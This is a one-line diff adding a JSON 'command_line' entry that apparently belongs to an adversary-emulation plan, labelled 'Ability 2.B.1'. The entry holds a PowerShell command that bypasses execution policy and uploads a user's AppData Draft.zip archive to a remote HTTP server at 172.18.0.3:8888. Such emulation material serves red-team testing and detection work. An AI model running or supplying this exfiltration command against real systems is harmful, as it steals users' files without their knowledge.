@@ -1,0 +1,1 @@
+"command_line": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\upload.ps1 -Verbose -Force;Invoke-MultipartFormDataUpload -InFile \"C:\\Users\\client1\\AppData\\Roaming\\Draft.zip\" -Uri \"http://172.18.0.3:8888/file/upload\";if ($?) {      write-host \"[+] Ability 2.B.1 executed successfully.\";}"
